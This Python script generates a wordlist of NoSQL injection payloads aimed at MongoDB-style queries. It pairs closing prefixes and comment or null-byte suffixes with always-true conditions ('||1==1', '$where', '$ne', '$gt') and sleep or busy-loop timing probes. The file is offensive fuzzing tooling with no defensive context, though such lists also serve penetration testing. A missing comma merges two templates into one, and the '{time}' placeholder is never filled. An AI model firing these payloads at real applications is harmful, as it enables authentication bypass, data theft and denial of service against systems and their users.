prefixes = [
    '',
    ', ',
    '";',
    '", ',
    '"}, ',
    '"), ',
    '"}), ',
    '")}, ',
    '}, ',
    '), ',
    '}), ',
    ')}, ',
    '}], '
]

suffixes = [
    '',
    ';',
    ' //',
    ', $comment: "',
    '%00'
]

templates = [
    '"\;{}', # syntax error
    '||"a"=="a{no_suffix}',
    '||1==1{no_suffix}',
    '$where: "1 == 1{no_suffix}',
    '$or: [ {}, { "a":"a{no_suffix}'
    '$where: "1 == 1"',
    'true, $where: "1 == 1"',
    '{ $ne: 1 }',
    '{$gt: ""}',
    'sleep({time})',
    'it=new Date();do{pt=new Date();}while(pt-it<{time})'
]


def generate():
    wordlist = []

    for prefix in prefixes:
        for suffix in suffixes:
            for template in templates:
                word = prefix + template
                
                if not '{no_suffix}' in word:
                    word += suffix
                else:
                    word = word.replace('{no_suffix}', '')

                wordlist.append(word)
                wordlist.append(word.replace('"', '\''))
    
    wordlist = list(set(wordlist))
    return wordlist
